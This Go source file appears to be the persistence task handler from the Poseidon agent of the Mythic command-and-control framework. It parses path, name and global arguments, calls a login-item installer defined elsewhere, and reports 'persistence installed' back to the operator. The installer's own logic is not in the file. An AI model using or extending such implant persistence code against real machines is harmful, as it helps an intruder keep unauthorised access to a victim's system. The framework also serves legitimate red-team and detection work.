package persist_loginitem

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

type Arguments struct {
	Path   string `json:"path"`
	Name   string `json:"name"`
	Global bool   `json:"global"`
}

func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	args := Arguments{}
	err := json.Unmarshal([]byte(task.Params), &args)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	r, err := runCommand(args.Path, args.Name, args.Global)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"
		task.Job.SendResponses <- msg
		return
	}

	if r.Successful {
		msg.UserOutput = "persistence installed"
		msg.Completed = true
		task.Job.SendResponses <- msg
	} else {
		msg.UserOutput = "failed to install login item persistence"
		msg.Completed = true
		task.Job.SendResponses <- msg
	}

	return
}
